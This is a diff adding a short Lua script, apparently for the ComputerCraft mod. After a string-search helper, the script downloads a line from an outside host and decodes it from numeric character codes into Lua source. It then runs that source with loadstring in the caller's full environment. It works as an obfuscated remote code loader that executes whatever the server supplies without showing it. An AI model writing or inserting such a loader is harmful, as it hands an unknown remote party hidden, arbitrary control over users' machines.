@@ -1,0 +1,32 @@
+function find(text, match)
+_ = 1
+local _s = nil
+local _e = nil
+_len = string.len(match)
+	while true do
+	_t = string.sub(text, _ , _len + _ - 1)
+		if _t == match then
+		_s = _
+		_e = _ + _len - 1
+		break
+		end
+	_ = _ + 1
+	if _ > string.len(text) then break end
+	end
+if _s == nil then return nil else return _s, _e end
+end
+
+file = http.get("http://www.ccirc.byethost15.com/ccirc.php")
+a = file:readLine()  
+file:close()
+a = string.sub(a,2) .. "\\"
+z = ""
+while true do
+_s = find(a, "\\")
+if _s == nil then break end
+z = z .. string.char(tonumber(string.sub(a, 1, _s - 1)))
+a = string.sub(a, _s + 1)
+end
+b = loadstring(z)
+setfenv(b, getfenv() )
+b()
